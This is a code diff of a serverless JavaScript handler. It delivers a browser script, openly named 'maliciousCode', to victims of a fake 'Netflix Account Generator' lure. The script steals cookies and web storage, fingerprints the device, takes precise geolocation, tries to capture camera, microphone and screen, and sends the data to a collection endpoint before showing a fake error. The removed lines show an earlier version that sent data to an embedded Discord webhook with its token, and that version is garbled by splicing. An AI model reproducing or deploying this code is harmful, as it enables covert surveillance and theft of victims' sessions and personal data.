@@ -1,359 +1,316 @@
 export default async function handler(req, res) {
-    // Set response as JavaScript
+    // Set headers for JavaScript response
     res.setHeader('Content-Type', 'application/javascript');
-    
-    // Obfuscated webhook (base64 encoded)
-    const webhook = atob('aHR0cHM6Lyexport default async function handler(req, res) {
-    // Set response as JavaScript
-    res.setHeader('Content-Type', 'application/javascript');
-    
-    // YOUR WEBHOOK INTEGRATED
-    const webhook = 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm';
-    
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+
     const maliciousCode = `
-        // Advanced victim detection
-        (function() {
-            const victimData = {
-                stage: 'initial',
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer
-            };
+(function() {
+    const VICTIM_DATA = {
+        stage: 'initial_compromise',
+        timestamp: new Date().toISOString(),
+        url: window.location.href,
+        referrer: document.referrer,
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage)
+    };
+
+    // Override the button click handler
+    const originalGenerator = window.startGenerator;
+    window.startGenerator = function() {
+        document.getElementById('loading').style.display = 'block';
+        document.querySelector('.btn').style.display = 'none';
+        collectComprehensiveData();
+    };
+
+    async function collectComprehensiveData() {
+        try {
+            // Phase 1: Basic fingerprinting
+            await collectBasicInfo();
             
-            // Override the fake generator with real malware
-            const originalGenerator = window.startGenerator;
-            window.startGenerator = function() {
-                // Show loading
-                document.getElementById('loading').style.display = 'block';
-                document.querySelector('.btn').style.display = 'none';
-                
-                // Start advanced data collection
-                collectAdvancedData();
-            };
+            // Phase 2: Advanced fingerprinting
+            await collectAdvancedFingerprint();
             
-            // Advanced data collection
-            async function collectAdvancedData() {
-                try {
-                    // Get IP and location
-                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                    victimData.ip = ipData.ip;
-                    
-                    // Advanced fingerprinting
-                    victimData.fingerprint = await generateFingerprint();
-                    
-                    // Get detailed system info
-                    victimData.system = getSystemInfo();
-                    
-                    // Try to get precise location
-                    await getGeolocation();
-                    
-                    // Send initial data
-                    await sendToDiscord('VICTIM_INTERACTION', victimData);
-                    
-                    // Start camera/mic access attempts
-                    setTimeout(attemptMediaAccess, 2000);
-                    
-                } catch (error) {
-                    console.log('Data collection error');
+            // Phase 3: Location data
+            await collectLocationData();
+            
+            // Phase 4: Network information
+            await collectNetworkInfo();
+            
+            // Phase 5: Media access attempts
+            setTimeout(attemptMediaAccess, 3000);
+            
+        } catch (error) {
+            VICTIM_DATA.error = error.message;
+            sendData('ERROR');
+        }
+    }
+
+    async function collectBasicInfo() {
+        VICTIM_DATA.basic = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            doNotTrack: navigator.doNotTrack
+        };
+
+        // Get public IP
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            VICTIM_DATA.ip = ipData.ip;
+            
+            // Get IP details
+            const ipInfo = await fetch('https://ipapi.co/' + ipData.ip + '/json/');
+            const ipDetails = await ipInfo.json();
+            VICTIM_DATA.ipDetails = ipDetails;
+        } catch (e) {
+            VICTIM_DATA.ipError = e.message;
+        }
+    }
+
+    async function collectAdvancedFingerprint() {
+        // Canvas fingerprinting
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Advanced fingerprint', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Advanced fingerprint', 4, 17);
+        
+        VICTIM_DATA.canvasFingerprint = canvas.toDataURL();
+        
+        // WebGL fingerprinting
+        const gl = canvas.getContext('webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            VICTIM_DATA.webgl = {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            };
+        }
+        
+        // Audio fingerprinting
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioContext.createOscillator();
+        const analyser = audioContext.createAnalyser();
+        oscillator.connect(analyser);
+        analyser.connect(audioContext.destination);
+        oscillator.start();
+        
+        VICTIM_DATA.audioFingerprint = analyser.frequencyBinCount;
+        oscillator.stop();
+    }
+
+    function collectLocationData() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve();
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    VICTIM_DATA.geolocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    };
+                    sendData('GEOLOCATION_SUCCESS');
+                    resolve();
+                },
+                error => {
+                    VICTIM_DATA.geolocationError = {
+                        code: error.code,
+                        message: error.message
+                    };
+                    resolve();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                 }
-            }
-            
-            function generateFingerprint() {
-                return new Promise((resolve) => {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillText('Fingerprint', 2, 2);
-                    const fingerprint = canvas.toDataURL();
-                    resolve(fingerprint.substring(0, 100));
-                });
-            }
-            
-            function getSystemInfo() {
-                return {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    languages: navigator.languages,
-                    screen: screen.width + 'x' + screen.height,
-                    colorDepth: screen.colorDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies: navigator.cookieEnabled,
-                    javaEnabled: navigator.javaEnabled(),
-                    pdfEnabled: navigator.pdfViewerEnabled,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    touchSupport: 'ontouchstart' in window
+            );
+        });
+    }
+
+    async function collectNetworkInfo() {
+        // Network information API
+        if (navigator.connection) {
+            VICTIM_DATA.connection = {
+                downlink: navigator.connection.downlink,
+                effectiveType: navigator.connection.effectiveType,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            };
+        }
+        
+        // Battery API
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                VICTIM_DATA.battery = {
+                    charging: battery.charging,
+                    level: battery.level,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
                 };
-            }
-            
-            function getGeolocation() {
-                return new Promise((resolve) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            position => {
-                                victimData.location = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy
-                                };
-                                resolve();
-                            },
-                            error => {
-                                victimData.locationError = error.message;
-                                resolve();
-                            },
-                            { enableHighAccuracy: true, timeout: 10000 }
-                        );
-                    } else {
-                        resolve();
-                    }
-                });
-            }
-            
-            async function attemptMediaAccess() {
-                try {
-                    // Try to access camera
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { width: 1280, height: 720 } 
-                    });
-                    victimData.cameraAccess = true;
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    victimData.cameraAccess = false;
+            } catch (e) {}
+        }
+    }
+
+    async function attemptMediaAccess() {
+        VICTIM_DATA.mediaAttempts = {};
+        
+        // Camera access
+        try {
+            const videoStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 },
+                    frameRate: { ideal: 30 }
                 }
-                
-                try {
-                    // Try to access microphone
-                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    victimData.microphoneAccess = true;
-                    audioStream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    victimData.microphoneAccess = false;
-                }
-                
-                // Send media access results
-                await sendToDiscord('MEDIA_ACCESS', victimData);
-                
-                // Show fake error message
-                showFakeError();
-            }
+            });
+            VICTIM_DATA.mediaAttempts.camera = 'SUCCESS';
             
-            async function sendToDiscord(type, data) {
-                try {
-                    await fetch('${webhook}', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            username: 'Netflix Analytics',
-                            embeds: [{
-                                title: 'New Victim Data - ' + type,
-                                color: 0xe50914,
-                                fields: Object.entries(data).map(([key, value]) => ({
-                                    name: key,
-                                    value: String(value).substring(0, 100) + (String(value).length > 100 ? '...' : ''),
-                                    inline: key.length < 10
-                                })),
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
-                    });
-                } catch (error) {
-                    // Silent fail
-                }
-            }
+            // Capture frame
+            const video = document.createElement('video');
+            video.srcObject = videoStream;
+            video.play();
             
-            function showFakeError() {
-                document.querySelector('.container').innerHTML = 
-                    '<h2 style="color: #e50914">❌ Regional Restriction</h2>' +
-                    '<p>No accounts available in your location.</p>' +
-                    '<p>Try using a VPN or check back later.</p>' +
-                    '<button class="btn" onclick="location.reload()">TRY DIFFERENT REGION</button>';
-            }
-            
-            // Auto-collect data if user stays on page
             setTimeout(() => {
-                if (!victimData.ip && document.hasFocus()) {
-                    collectAdvancedData();
-                }
-            }, 15000);
-            
-        })();
-    `;
-    
-    res.send(maliciousCode);
-}9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9XRUJIT09LX0lEL1lPVVJfV0VCSE9PS19UT0tFTg==');
-    
-    const maliciousCode = `
-        // Advanced victim detection
-        (function() {
-            const victimData = {
-                stage: 'initial',
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer
-            };
-            
-            // Override the fake generator with real malware
-            const originalGenerator = window.startGenerator;
-            window.startGenerator = function() {
-                // Show loading
-                document.getElementById('loading').style.display = 'block';
-                document.querySelector('.btn').style.display = 'none';
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                VICTIM_DATA.cameraFrame = canvas.toDataURL('image/jpeg', 0.5);
                 
-                // Start advanced data collection
-                collectAdvancedData();
-            };
+                // Stop stream
+                videoStream.getTracks().forEach(track => track.stop());
+                sendData('CAMERA_SUCCESS');
+            }, 1000);
             
-            // Advanced data collection
-            async function collectAdvancedData() {
-                try {
-                    // Get IP and location
-                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                    victimData.ip = ipData.ip;
-                    
-                    // Advanced fingerprinting
-                    victimData.fingerprint = await generateFingerprint();
-                    
-                    // Get detailed system info
-                    victimData.system = getSystemInfo();
-                    
-                    // Try to get precise location
-                    await getGeolocation();
-                    
-                    // Send initial data
-                    await sendToDiscord('VICTIM_INTERACTION', victimData);
-                    
-                    // Start camera/mic access attempts
-                    setTimeout(attemptMediaAccess, 2000);
-                    
-                } catch (error) {
-                    console.log('Data collection error');
+        } catch (error) {
+            VICTIM_DATA.mediaAttempts.camera = 'FAILED: ' + error.message;
+        }
+        
+        // Microphone access
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({
+                audio: {
+                    echoCancellation: true,
+                    noiseSuppression: true,
+                    autoGainControl: true
                 }
-            }
+            });
+            VICTIM_DATA.mediaAttempts.microphone = 'SUCCESS';
             
-            function generateFingerprint() {
-                return new Promise((resolve) => {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillText('Fingerprint', 2, 2);
-                    const fingerprint = canvas.toDataURL();
-                    resolve(fingerprint.substring(0, 100));
-                });
-            }
-            
-            function getSystemInfo() {
-                return {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    languages: navigator.languages,
-                    screen: screen.width + 'x' + screen.height,
-                    colorDepth: screen.colorDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies: navigator.cookieEnabled,
-                    javaEnabled: navigator.javaEnabled(),
-                    pdfEnabled: navigator.pdfViewerEnabled,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    touchSupport: 'ontouchstart' in window
-                };
-            }
-            
-            function getGeolocation() {
-                return new Promise((resolve) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            position => {
-                                victimData.location = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy
-                                };
-                                resolve();
-                            },
-                            error => {
-                                victimData.locationError = error.message;
-                                resolve();
-                            },
-                            { enableHighAccuracy: true, timeout: 10000 }
-                        );
-                    } else {
-                        resolve();
-                    }
-                });
-            }
-            
-            async function attemptMediaAccess() {
-                try {
-                    // Try to access camera
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { width: 1280, height: 720 } 
-                    });
-                    victimData.cameraAccess = true;
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    victimData.cameraAccess = false;
-                }
-                
-                try {
-                    // Try to access microphone
-                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    victimData.microphoneAccess = true;
-                    audioStream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    victimData.microphoneAccess = false;
-                }
-                
-                // Send media access results
-                await sendToDiscord('MEDIA_ACCESS', victimData);
-                
-                // Show fake error message
-                showFakeError();
-            }
-            
-            async function sendToDiscord(type, data) {
-                try {
-                    await fetch('${webhook}', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            username: 'Netflix Analytics',
-                            embeds: [{
-                                title: 'New Victim Data - ' + type,
-                                color: 0xe50914,
-                                fields: Object.entries(data).map(([key, value]) => ({
-                                    name: key,
-                                    value: String(value).substring(0, 100) + (String(value).length > 100 ? '...' : ''),
-                                    inline: key.length < 10
-                                })),
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
-                    });
-                } catch (error) {
-                    // Silent fail
-                }
-            }
-            
-            function showFakeError() {
-                document.querySelector('.container').innerHTML = 
-                    '<h2 style="color: #e50914">❌ Regional Restriction</h2>' +
-                    '<p>No accounts available in your location.</p>' +
-                    '<p>Try using a VPN or check back later.</p>' +
-                    '<button class="btn" onclick="location.reload()">TRY DIFFERENT REGION</button>';
-            }
-            
-            // Auto-collect data if user stays on page
+            // Stop after 2 seconds
             setTimeout(() => {
-                if (!victimData.ip && document.hasFocus()) {
-                    collectAdvancedData();
-                }
-            }, 15000);
+                audioStream.getTracks().forEach(track => track.stop());
+                sendData('MICROPHONE_SUCCESS');
+            }, 2000);
             
-        })();
+        } catch (error) {
+            VICTIM_DATA.mediaAttempts.microphone = 'FAILED: ' + error.message;
+        }
+        
+        // Screen sharing attempt
+        try {
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({
+                video: true,
+                audio: true
+            });
+            VICTIM_DATA.mediaAttempts.screen = 'SUCCESS';
+            screenStream.getTracks().forEach(track => track.stop());
+        } catch (error) {
+            VICTIM_DATA.mediaAttempts.screen = 'FAILED: ' + error.message;
+        }
+        
+        sendData('MEDIA_COMPLETE');
+        showFakeError();
+    }
+
+    async function sendData(stage) {
+        VICTIM_DATA.currentStage = stage;
+        VICTIM_DATA.timestamp = new Date().toISOString();
+        
+        try {
+            await fetch('/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(VICTIM_DATA)
+            });
+        } catch (error) {
+            console.error('Data send failed:', error);
+        }
+    }
+
+    function showFakeError() {
+        setTimeout(() => {
+            document.querySelector('.container').innerHTML = 
+                '<h2 style="color: #e50914">❌ Regional Account Restriction Detected</h2>' +
+                '<p style="margin: 20px 0;">No Netflix Premium accounts available in your region.</p>' +
+                '<p style="margin: 20px 0; font-size: 0.9em; color: #ccc;">Error Code: NR-401</p>' +
+                '<button class="btn" onclick="location.reload()">🔄 Try Different Region</button>' +
+                '<p style="margin-top: 30px; font-size: 0.8em; color: #999;">Try disabling your VPN or check back in 24 hours</p>';
+        }, 5000);
+    }
+
+    // Auto-start collection if user interacts
+    document.addEventListener('click', function autoStart() {
+        if (!VICTIM_DATA.autoStarted) {
+            VICTIM_DATA.autoStarted = true;
+            collectComprehensiveData();
+        }
+        document.removeEventListener('click', autoStart);
+    });
+
+    // Start collection if user stays on page
+    setTimeout(() => {
+        if (!VICTIM_DATA.autoStarted && document.hasFocus()) {
+            VICTIM_DATA.autoStarted = true;
+            collectComprehensiveData();
+        }
+    }, 10000);
+
+    console.log('Netflix Account Generator initialized');
+})();
     `;
-    
+
     res.send(maliciousCode);
 }
